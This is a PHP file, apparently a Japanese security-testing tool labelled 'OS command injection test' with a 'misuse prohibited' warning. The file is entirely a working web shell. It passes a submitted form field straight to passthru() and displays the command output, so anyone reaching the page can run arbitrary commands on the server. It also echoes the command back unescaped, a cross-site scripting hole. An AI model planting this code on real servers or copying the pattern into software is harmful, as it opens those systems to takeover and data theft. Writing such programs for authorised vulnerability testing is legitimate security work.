/**
 * 【悪用厳禁】
 * 表題：OSコマンドインジェクションテスト（PHP）
 * 説明：OSコマンドインジェクション脆弱性を検証するためのPHPプログラムです。
 * 概要：フォームからサブミットされたコマンドを受け取りOSコマンドを実行して結果を表示する。
 */

// OSコマンド実行
$exec_cmd = "";
if ( isset($_POST['exec_cmd']) ) {
  $exec_cmd = $_POST['exec_cmd'];
  ob_start();
  passthru($exec_cmd);
  $cmd_result = ob_get_contents();
  ob_end_clean();
  $cmd_result = nl2br($cmd_result);
}

// 画面表示（HTML）
$html =<<<__EOL__
<!DOCTYPE html>
<html>
<head>
</head>
<body>
<h1>OS Command Injection Test Program</h1>
<div>---- Input Command To Submit----</div>
<div>
<form method="post">
<input type="text" name="exec_cmd"></input><br />
<input type="submit" value="submit"></input>
</form>
</div>
<br />
<div>---- Exec OS Cmd ----</div>
<div>
$exec_cmd<br />
</div>
<div>---- OS Cmd Result ----</div>
<div>
$cmd_result
</div>
</body>
</html>
__EOL__;

header("Content-type: text/html; charset=UTF-8");
echo $html;
